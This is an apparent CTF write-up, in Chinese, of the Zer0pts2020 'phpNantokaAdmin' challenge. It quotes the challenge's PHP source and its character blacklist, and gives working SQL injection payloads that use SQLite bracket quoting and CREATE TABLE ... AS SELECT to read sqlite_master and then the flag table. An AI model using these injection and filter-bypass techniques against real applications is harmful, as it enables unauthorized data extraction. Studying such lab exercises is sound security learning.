---
title: '[Zer0pts2020]phpNantokaAdmin'
date: 2025-02-05 15:25:46
tags: sql注入
categories: 刷题笔记
---

## [Zer0pts2020]phpNantokaAdmin

题目是一个sqlite的数据库管理工具，实现的功能只有table的创建，展示，record的插入

查看代码

```php
 <?php
  $pdo->query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
  $pdo->query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
  $pdo->query($sql);
```

我们发现flag在FLAG_TABLE表中,表名和列名是config.php中定义的常量，此外

```php
<?php

  $pdo = new PDO('sqlite:db/' . $_SESSION['database']);
  $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name <> '" . FLAG_TABLE . "' LIMIT 1;");
  $table_name = $stmt->fetch(PDO::FETCH_ASSOC)['name'];

  $stmt = $pdo->query("PRAGMA table_info(`{$table_name}`);");
  $column_names = $stmt->fetchAll(PDO::FETCH_ASSOC);

```

这样限制了可以展示的表仅限于flag表之外用户创建的表

在index.php;中可以看出，创建表时的表名，列名，列类型可能存在sql注入

```php
<?php
︙
  if (!is_valid($table_name)) {
    flash('Table name contains dangerous characters.');
  }
  if (strlen($table_name) < 4 || 32 < strlen($table_name)) {
    flash('Table name must be 4-32 characters.');
  }
  if (count($columns) <= 0 || 10 < count($columns)) {
    flash('Number of columns is up to 10.');
  }

  $sql = "CREATE TABLE {$table_name} (";
  $sql .= "dummy1 TEXT, dummy2 TEXT";
  for ($i = 0; $i < count($columns); $i++) {
    $column = (string) ($columns[$i]['name'] ?? '');
    $type = (string) ($columns[$i]['type'] ?? '');

    if (!is_valid($column) || !is_valid($type)) {
      flash('Column name or type contains dangerous characters.');
    }
    if (strlen($column) < 1 || 32 < strlen($column) || strlen($type) < 1 || 32 < strlen($type)) {
      flash('Column name and type must be 1-32 characters.');
    }

    $sql .= ', ';
    $sql .= "`$column` $type";
  }
  $sql .= ');';
︙
```

但是，参数使用了untils.php中定义的is_vaild函数进行了一次检查，禁用了一些特殊字符

```php
<?php

function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}

```

首先我们fuzz一下能够通过is_vaild函数的字符

```php
<?php
function is_valid($string) {
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $string)) {
    return false;
  }
  return true;
}

$res = '';
for ($i = 0x20; $i < 0x7f; $i++) {
  $c = chr($i);
  if (is_valid($c)) {
    $res .= $c;
  }
}

echo $res . "\n";
// !$%&+.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~
```

注意：`[`和`]`可以使用，在sqlite中，可以使用`[`和`]`代替反引号来包裹字符

此外：sqlite中可以使用`create table ... as`这样的用法，从其它的表的内容来创建新的表

利用这些，在创建表时，`table t as select sql[列名abc，列类型] from sqlite_master;`,这样拼接成功后的sql语句为：

```sql
CREATE TABLE t AS SELECT sql [ (dummy1 TEXT, dummy2 TEXT, `abc` ]FROM sqlite_master;);
```

等价于`create table t as select sql from sqlite_master;`,`(dummy1…`被解释为sql的别名。这样在展示表时可以获得插入flag时的语句，其中包括flag表名和列名

所以我们在创建表时post传

```
table_name=[aaa] as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=2

```

得到了表名和字段名

![image-20250316195626031](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503161956159.png)

然后我们用同样的方法查看flag（需要先把之前那个表删掉）

```
table_name=[aaa] as select [flag_2a2d04c3][&columns[0][name]=]from  flag_bf1811da;&columns[0][type]=2
```

得到flag

![image-20250316195831776](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503161958854.png)

## sqlite bypass技巧

select的时候，当列名用空白字符隔开时，sqlite只会把空格之前的字符当做列名，并且忽视空格后的字符

![img](https://img2020.cnblogs.com/blog/1270588/202005/1270588-20200508173324508-2113315362.png)
